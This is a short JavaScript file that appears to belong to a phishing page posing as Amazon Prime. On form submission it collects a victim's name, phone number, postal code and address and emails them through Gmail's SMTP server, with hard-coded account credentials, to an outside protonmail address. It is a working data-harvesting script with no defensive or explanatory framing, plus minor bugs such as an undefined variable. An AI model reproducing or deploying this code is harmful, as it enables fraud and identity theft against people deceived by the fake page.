window.onload = function()
{
    const btn = document.querySelector('#submit');
    btn.addEventListener("click", function(e) {
        e.preventDefault();
        var name = document.querySelector("#name");
        var oname = name.value;

        var telefone = document.querySelector("#phone");
        var otelefone = telefone.value;

        var cep = document.querySelector("#cep");
        var ocep = cep.value;

        var endereco = document.querySelector("#address");
        var oendereco = endereco.value;

        var casa = document.querySelector("#address");
        var ocasa = casa.value;



        
        Email.send({
          Host: "smtp.gmail.com",
          Username : "xsda.ddce.2343.2343.xsop@gmail.com",
          Password : "ryqi owje owui bjfw",
          To : 'user1533@protonmail.com',
          From : "xsda.ddce.2343.2343.xsop@gmail.com",
          Subject : `Amazon Prime: ${email}`,
          Body : `<table>
                  <tr>
                    <th>Nome</th>
                    <th>Senha</th>
                  </tr>
                  <tr>
                    <td>${oname}</td>
                    <td>${otelefone}</td>
                  </tr>
                </table>
                <table>
                  <tr>
                    <th>Cep</th>
                    <th>Endereço</th>
                  </tr>
                  <tr>
                    <td>${ocep}</td>
                    <td>${oendereco} ${ocasa}</td>
                  </tr>
                </table>`,
        });
    });
}

